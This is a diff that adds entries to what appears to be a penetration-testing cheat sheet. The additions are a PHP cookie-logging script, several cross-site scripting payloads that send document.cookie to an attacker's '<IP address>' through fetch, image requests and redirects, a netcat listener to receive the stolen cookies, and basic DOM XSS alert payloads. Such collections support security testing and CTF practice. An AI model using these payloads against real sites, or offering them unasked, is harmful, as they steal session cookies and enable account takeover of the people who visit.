@@ -490,11 +490,44 @@ https://www.boxentriq.com/code-breaking/cipher-identifier
 <script>new Image().src='http://<IP address>/index.php?c='+document.cookie</script>	
 ```
 
+- Cookie Logging Script (log.php)
+
+```
+# Host log.php $ php -S <IP address>:8000
+
+<?php
+$logFile = "cookieLog.txt";
+$cookie = $_REQUEST["c"];
+
+$handle = fopen($logFile, "a");
+fwrite($handle, $cookie . "\n\n");
+fclose($handle);
+
+header("Location: http://www.google.com/");
+exit;
+?>
+
+# Enter into input field <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<IP address>:8000/log.php?c=' + document.cookie;"></video>
+```
+
+- Cookie Logging via Netcat
+
+```
+# Listen $ nc -nlvp 8000
+
+# Enter into input field <h1 onmouseover='document.write(`<img src="http://<IP address>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+OR
+# Enter into input field <script>fetch(`http://<IP address>:8000?cookie=${btoa(document.cookie)}`)</script>
+```
+
 - DOM XSS Payloads
 
 ```
 #"><img src=/ onerror=alert(document.cookie)>
 <img src="" onerror=alert(window.origin)>
+"><img src=x onerror=prompt(document.domain)>
+"><img src=x onerror=confirm(1)>
+"><img src=x onerror=alert(1)>
 ```
 
 - Bulk XSS Payloads
